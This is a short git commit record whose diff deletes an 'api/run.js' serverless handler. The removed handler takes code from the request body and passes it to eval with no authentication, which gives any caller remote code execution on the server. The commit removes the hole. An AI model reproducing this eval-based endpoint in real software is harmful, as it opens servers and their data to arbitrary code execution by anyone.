20f6d04c1ee518bcbdc82d5f09beb121b94d5b3f
vinzz-officials <vinzz4358@gmail.com>
2025-12-05 20:18:40 +0800

    Delete api directory

--- api/run.js
+++
@@ -1,9 +0,0 @@
-export default async function handler(req, res) {
-  try {
-    const code = req.body.code;
-    const out = await eval(`(async()=>{ ${code} })()`);
-    res.json({ ok: true, result: out });
-  } catch (e) {
-    res.json({ ok: false, error: e.toString() });
-  }
-}
